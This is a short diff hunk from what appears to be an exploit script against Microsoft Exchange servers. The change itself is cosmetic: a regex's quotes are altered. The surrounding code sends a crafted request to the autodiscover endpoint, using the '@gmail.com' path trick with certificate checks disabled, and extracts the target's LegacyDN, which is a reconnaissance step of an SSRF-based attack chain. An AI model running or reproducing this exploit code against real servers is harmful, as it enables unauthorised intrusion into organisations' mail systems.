@@ -110,7 +110,7 @@ def exploit(target):
         }
         resc = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/autodiscover.xml", headers=ec_headers, data=autodiscover_data, verify=False)
         if f"DisplayName" in resc.text:
-            legacydn = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', resc.text)
+            legacydn = re.findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
             print(f"[+] LegacyDN: {legacydn}")
         else:
             print("[-] No LegacyDN")
